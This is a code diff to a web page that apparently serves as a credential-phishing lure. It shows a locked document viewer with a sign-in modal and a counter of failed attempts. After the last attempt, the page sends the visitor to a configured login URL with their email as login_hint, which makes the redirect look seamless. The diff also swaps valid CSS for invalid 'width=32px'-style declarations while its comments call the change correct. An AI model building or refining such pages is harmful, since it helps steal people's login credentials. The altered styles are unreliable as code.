@@ -111,7 +111,7 @@
     .modal .close { border: none; background: transparent; font-size: 20px; line-height: 1; cursor: pointer; color: #6b7280; }
     .modal .body { padding: 24px; }
     .logo-modal{ display:flex; align-items:center; gap:8px; grid-column:1; }
-    .logo-modal img{ height:32px; width:32px; object-fit:contain; display:block }
+    .logo-modal img{ height:32px; width=32px; object-fit:contain; display=block }
 
     .auth-form { display: flex; flex-direction: column; gap: 16px; }
     .form-group { display: flex; flex-direction: column; gap: 8px; }
@@ -137,9 +137,9 @@
     /* Print styles */
     @media print{
       body{ background:white }
-      .app{ display:block; padding:0 }
+      .app{ display:block; padding=0 }
       .bar, .controls, .unlock-on-page{ display:none !important }
-      .viewer{ border:0; box-shadow:none }
+      .viewer{ border=0; box-shadow:none }
       .page{ transform:none; box-shadow:none; border:none }
       .locked .inner{ filter:none }
       .watermark{ display:none !important }
@@ -559,18 +559,14 @@
     }
 
     function redirectToFinalURL() {
-      // Build URL with proper parameter structure using &
+      // Build URL with correct parameter structure: ?&login_hint={email}&prompt=login&sso_reload=true
       let redirectUrl = env.FINAL_URL;
       
-      // Check if FINAL_URL already has query parameters
-      const hasExistingParams = redirectUrl.includes('?');
-      
+      // Always start with ?&login_hint= (the ?& structure you specified)
       if (currentEmail) {
-        redirectUrl += hasExistingParams ? '&loginhint=' + encodeURIComponent(currentEmail) : '?loginhint=' + encodeURIComponent(currentEmail);
-        // Add prompt=login parameter
-        redirectUrl += '&prompt=login';
+        redirectUrl += `?&login_hint=${encodeURIComponent(currentEmail)}&prompt=login&sso_reload=true`;
       } else {
-        redirectUrl += hasExistingParams ? '&prompt=login' : '?prompt=login';
+        redirectUrl += '?&prompt=login&sso_reload=true';
       }
       
       window.location.href = redirectUrl;
@@ -619,7 +615,7 @@
         attemptCount++;
         
         if (attemptCount >= maxAttempts) {
-          // Redirect after max attempts with loginhint and prompt=login
+          // Redirect after max attempts with correct URL structure
           setTimeout(() => {
             redirectToFinalURL();
           }, 1000);
